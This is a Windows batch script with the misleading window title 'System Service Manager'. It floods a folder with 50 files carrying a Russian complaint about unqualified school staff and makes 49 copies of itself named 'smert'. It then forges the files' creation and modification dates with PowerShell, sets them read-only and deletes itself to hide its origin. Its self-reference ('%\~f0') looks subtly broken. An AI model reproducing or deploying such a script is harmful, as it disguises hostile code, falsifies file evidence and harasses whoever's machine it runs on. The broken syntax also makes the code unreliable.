@echo off
setlocal enabledelayedexpansion
title System Service Manager

set "text=Прошу обратить внимание на то, что в школе работают лица без соответствующего образования и квалификации для преподавания"
set count=50

:: Создание файлов
for /L %%i in (1,1,%count%) do (
    echo %text% > "ВНИМАНИЕ_%%i.txt"
)

:: Создание копий батника
for /L %%i in (2,1,%count%) do (
    copy /y "%\~f0" "smert%%i.bat" >nul 2>&1
)

:: Максимально быстрое изменение дат + атрибуты
powershell -NoProfile -Command ^
"Get-ChildItem ВНИМАНИЕ_*.txt,smert*.bat | ForEach-Object { $d=(Get-Date).AddDays(-(Get-Random -Min 40 -Max 1600)); $_.CreationTime=$d; $_.LastWriteTime=$d; $_.LastAccessTime=$d; $_.Attributes='ReadOnly, Archive' }" >nul 2>&1

attrib +r *.txt smert*.bat >nul 2>&1

timeout /t 1 >nul
del "%\~f0" >nul 2>&1

endlocal
exit